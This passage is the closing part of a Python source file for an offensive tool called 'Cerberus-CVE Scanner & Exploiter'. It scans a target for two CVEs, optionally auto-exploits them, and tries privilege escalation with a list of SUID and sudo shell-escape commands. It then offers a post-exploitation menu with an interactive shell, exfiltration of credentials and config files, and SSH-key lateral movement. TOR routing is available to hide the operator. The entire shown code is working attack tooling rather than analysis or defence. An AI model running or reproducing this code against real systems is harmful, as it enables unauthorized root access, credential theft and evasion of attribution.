        print(f"\n{Colors.RED}[!] Attempting privilege escalation for {self.cve_id}{Colors.END}")
        
        try:
            exploitation_success = self._attempt_real_privilege_escalation()
            
            if exploitation_success:
                print(f"{Colors.GREEN}[+] Privilege escalation successful!{Colors.END}")
                print(f"{Colors.GREEN}[+] You now have elevated access on the target{Colors.END}")
                
                self._post_exploitation_menu()
                
                self.report_manager.add_exploitation_attempt(
                    self.cve_id, True, "Successfully elevated privileges", "Real privilege escalation techniques"
                )
                return True
            else:
                print(f"{Colors.RED}[-] Privilege escalation failed{Colors.END}")
                self.report_manager.add_exploitation_attempt(
                    self.cve_id, False, "Privilege escalation attempts failed", "Multiple real-world techniques"
                )
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[!] Privilege escalation error: {str(e)}{Colors.END}")
            self.report_manager.add_exploitation_attempt(
                self.cve_id, False, f"Privilege escalation error: {str(e)}", "N/A"
            )
            return False
    
    def _attempt_real_privilege_escalation(self) -> bool:
        """Attempt actual privilege escalation techniques"""
        print(f"{Colors.CYAN}[>] Executing real privilege escalation...{Colors.END}")
        
        # First try SUID binaries
        if self._exploit_suid_binaries():
            return True
            
        # Then try sudo misconfigurations
        if self._exploit_sudo_misconfig():
            return True
            
        return False
    
    def _exploit_suid_binaries(self) -> bool:
        """Actually exploit misconfigured SUID binaries"""
        print(f"{Colors.CYAN}[>] Scanning for exploitable SUID binaries...{Colors.END}")
        
        suid_find_command = "find / -perm -4000 -type f 2>/dev/null"
        suid_binaries_result = self.shell_manager.execute_real_command(suid_find_command)
        
        if not suid_binaries_result or "Command execution failed" in suid_binaries_result:
            print(f"{Colors.RED}[-] No SUID binaries found or error accessing{Colors.END}")
            return False
        
        exploitable_binaries = {
            '/bin/bash': ['bash -p', 'bash -c "bash -p"'],
            '/bin/dash': ['dash -p', 'dash -c "dash -p"'],
            '/usr/bin/find': ['find . -exec /bin/sh \\;', 'find / -exec /bin/sh \\;'],
            '/usr/bin/nmap': ['nmap --interactive', 'nmap -i'],
            '/usr/bin/vim': ['vim -c ":py import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"'],
            '/usr/bin/less': ['less /etc/passwd', '!/bin/sh'],
            '/usr/bin/more': ['more /etc/passwd', '!/bin/sh'],
            '/usr/bin/awk': ['awk \"BEGIN {system(\\"/bin/sh\\")}\"'],
            '/usr/bin/perl': ['perl -e \"exec /bin/sh\"'],
            '/usr/bin/python': ['python -c \"import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")\"'],
            '/usr/bin/python3': ['python3 -c \"import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")\"']
        }
        
        for binary_line in suid_binaries_result.split('\n'):
            binary = binary_line.strip()
            if binary in exploitable_binaries:
                print(f"{Colors.YELLOW}[!] Found exploitable SUID: {binary}{Colors.END}")
                
                for exploit_cmd in exploitable_binaries[binary]:
                    print(f"{Colors.CYAN}[>] Attempting: {exploit_cmd}{Colors.END}")
                    result = self.shell_manager.execute_real_command(exploit_cmd)
                    
                    whoami_result = self.shell_manager.execute_real_command("whoami")
                    if "root" in whoami_result and "Command execution failed" not in whoami_result:
                        print(f"{Colors.GREEN}[+] SUCCESS! Got root via {binary}{Colors.END}")
                        self.shell_manager.current_access_level = "root"
                        return True
        
        return False
    
    def _exploit_sudo_misconfig(self) -> bool:
        """Actually exploit sudo misconfigurations"""
        print(f"{Colors.CYAN}[>] Checking sudo privileges...{Colors.END}")
        
        sudo_l_result = self.shell_manager.execute_real_command("sudo -l")
        
        if "not allowed" in sudo_l_result or "not found" in sudo_l_result or "Command execution failed" in sudo_l_result:
            print(f"{Colors.RED}[-] No sudo access or sudo not available{Colors.END}")
            return False
        
        print(f"{Colors.YELLOW}[!] Sudo privileges:{Colors.END}")
        print(sudo_l_result)
        
        sudo_exploits = [
            "sudo bash",
            "sudo sh", 
            "sudo su",
            "sudo -i",
            "sudo passwd root",
            "sudo vi /etc/passwd",
            "sudo nmap --interactive",
            "sudo find / -exec /bin/sh \\;",
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
            "sudo perl -e 'exec \"/bin/sh\";'",
            "sudo python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        ]
        
        for exploit in sudo_exploits:
            print(f"{Colors.CYAN}[>] Trying: {exploit}{Colors.END}")
            result = self.shell_manager.execute_real_command(exploit)
            
            whoami_result = self.shell_manager.execute_real_command("whoami")
            if "root" in whoami_result and "Command execution failed" not in whoami_result:
                print(f"{Colors.GREEN}[+] SUDO EXPLOIT SUCCESS! Got root{Colors.END}")
                self.shell_manager.current_access_level = "root"
                return True
        
        return False

    def _post_exploitation_menu(self):
        """Post-exploitation menu for continued access"""
        while True:
            print(f"\n{Colors.PURPLE}{'='*60}{Colors.END}")
            print(f"{Colors.PURPLE}[ POST-EXPLOITATION MENU ]{Colors.END}")
            print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[1]{Colors.END} Interactive Shell")
            print(f"{Colors.CYAN}[2]{Colors.END} Data Exfiltration")
            print(f"{Colors.CYAN}[3]{Colors.END} Lateral Movement")
            print(f"{Colors.CYAN}[4]{Colors.END} Return to Main Menu")
            print(f"{Colors.PURPLE}{'='*60}{Colors.END}")
            
            choice = input(f"{Colors.BLUE}[?] Select option: {Colors.END}").strip()
            
            if choice == '1':
                self.shell_manager.interactive_shell()
            elif choice == '2':
                self._data_exfiltration()
            elif choice == '3':
                self._lateral_movement_menu()
            elif choice == '4':
                break
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
    
    def _lateral_movement_menu(self):
        """Lateral movement techniques"""
        while True:
            print(f"\n{Colors.PURPLE}[ LATERAL MOVEMENT ]{Colors.END}")
            print(f"{Colors.CYAN}[1]{Colors.END} SSH Key Discovery")
            print(f"{Colors.CYAN}[2]{Colors.END} Return")
            
            choice = input(f"{Colors.BLUE}[?] Select option: {Colors.END}").strip()
            
            if choice == '1':
                self.lateral_movement.attempt_ssh_key_discovery()
            elif choice == '2':
                return
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
    
    def _data_exfiltration(self):
        """Actually exfiltrate and display sensitive data"""
        if not self.shell_manager.has_real_access:
            print(f"{Colors.RED}[-] No command execution - cannot exfiltrate data{Colors.END}")
            return
            
        print(f"\n{Colors.CYAN}[>] Exfiltrating sensitive data...{Colors.END}")
        
        # Use the REAL data extraction method
        extracted_data = self.shell_manager.extract_real_data()
        
        if extracted_data:
            # Save in multiple formats
            creds_file = DataExtractor.save_credentials(extracted_data, self.target)
            configs_file = DataExtractor.save_configs(extracted_data, self.target)
            zip_file = self.report_manager.create_evidence_archive(extracted_data)
            
            print(f"{Colors.GREEN}[+] Credentials saved to: {creds_file}{Colors.END}")
            print(f"{Colors.GREEN}[+] Configs saved to: {configs_file}{Colors.END}")
            print(f"{Colors.GREEN}[+] Evidence archive: {zip_file}{Colors.END}")
            print(f"{Colors.GREEN}[+] Extracted {len(extracted_data)} files containing real data{Colors.END}")
            
            self.report_manager.add_shell_session(
                "Data Exfiltration",
                self.shell_manager.current_access_level,
                f"Extracted {len(extracted_data)} sensitive files"
            )
        else:
            print(f"{Colors.RED}[-] No sensitive data could be extracted{Colors.END}")

class CVEScanner:
    def __init__(self):
        self.banner()
        self.report_manager = ReportManager()
        
    def banner(self):
        print(f"""{Colors.CYAN}
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                          
     Cerberus-CVE Assessment Situation v3.0
           by: ek0ms savi0r
           REAL Command Execution Edition
{Colors.END}""")

    def scan_target(self, target: str, port: int, auto_exploit: bool = False):
        print(f"\n{Colors.GREEN}[+] Starting CVE assessment for {target}:{port}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Auto-exploit: {'ENABLED' if auto_exploit else 'DISABLED'}{Colors.END}")
        
        self.report_manager.set_target(f"{target}:{port}")
        
        scanners = [
            EnhancedCVE20259491(target, port, self.report_manager),
            EnhancedCVE202559287(target, port, self.report_manager)
        ]
        
        vulnerable_targets = []
        for scanner in scanners:
            if scanner.scan():
                vulnerable_targets.append(scanner)
        
        if auto_exploit and vulnerable_targets:
            print(f"\n{Colors.RED}[!] AUTO-EXPLOIT ENABLED - Attempting exploitation{Colors.END}")
            for scanner in vulnerable_targets:
                success = scanner.exploit()
                if success:
                    break
        elif vulnerable_targets:
            for scanner in vulnerable_targets:
                exploit = input(f"{Colors.BLUE}[?] Attempt exploitation for {scanner.cve_id}? (y/n): {Colors.END}").lower()
                if exploit == 'y':
                    success = scanner.exploit()
                    if success:
                        break
        
        self._generate_final_reports()

    def _generate_final_reports(self):
        """Generate comprehensive final reports"""
        print(f"\n{Colors.CYAN}[>] Generating final reports...{Colors.END}")
        
        reports = []
        
        for fmt in ["txt", "csv", "json"]:
            report_file = self.report_manager.save_report(fmt)
            reports.append(report_file)
            print(f"{Colors.GREEN}[+] {fmt.upper()} report: {report_file}{Colors.END}")
        
        print(f"\n{Colors.GREEN}[+] Scan completed. {len(reports)} reports generated.{Colors.END}")

def main():
    scanner = CVEScanner()
    
    parser = argparse.ArgumentParser(description='Cerberus-CVE Scanner & Exploiter v3.0 - REAL Command Execution')
    parser.add_argument('-t', '--target', help='Target IP/hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('--auto-exploit', action='store_true', help='Auto-exploit if vulnerable')
    parser.add_argument('--tor', action='store_true', help='Use TOR for anonymity')
    parser.add_argument('--tor-port', type=int, default=9050, help='TOR SOCKS port')
    parser.add_argument('--skip-tor-check', action='store_true', help='Skip TOR verification')
    
    args = parser.parse_args()
    
    tor_manager = None
    use_tor = args.tor or (not args.target and input(f"{Colors.BLUE}[?] Use TOR for anonymity? (y/n): {Colors.END}").lower() == 'y')
    
    if use_tor:
        tor_manager = TorManager(tor_port=args.tor_port)
        
        if args.skip_tor_check:
            print(f"{Colors.YELLOW}[*] Skipping TOR verification at user request{Colors.END}")
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", args.tor_port)
            socket.socket = socks.socksocket
            print(f"{Colors.GREEN}[+] TOR proxy enabled (verification skipped){Colors.END}")
        else:
            if not tor_manager.enable_tor():
                print(f"{Colors.RED}[!] TOR setup failed. Continuing without TOR...{Colors.END}")
                tor_manager = None
    
    target = args.target
    if not target:
        target = input(f"{Colors.BLUE}[?] Enter target IP/hostname: {Colors.END}").strip()
    
    port = args.port
    if not args.port:
        try:
            port = int(input(f"{Colors.BLUE}[?] Enter target port (default 80): {Colors.END}") or "80")
        except ValueError:
            port = 80
    
    auto_exploit = args.auto_exploit
    if not args.auto_exploit:
        auto_response = input(f"{Colors.BLUE}[?] Enable auto-exploit? (y/n, default n): {Colors.END}").lower()
        auto_exploit = auto_response == 'y'
    
    try:
        scanner.scan_target(target, port, auto_exploit)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {str(e)}{Colors.END}")
    finally:
        if tor_manager:
            tor_manager.disable_tor()

if __name__ == "__main__":
    main()
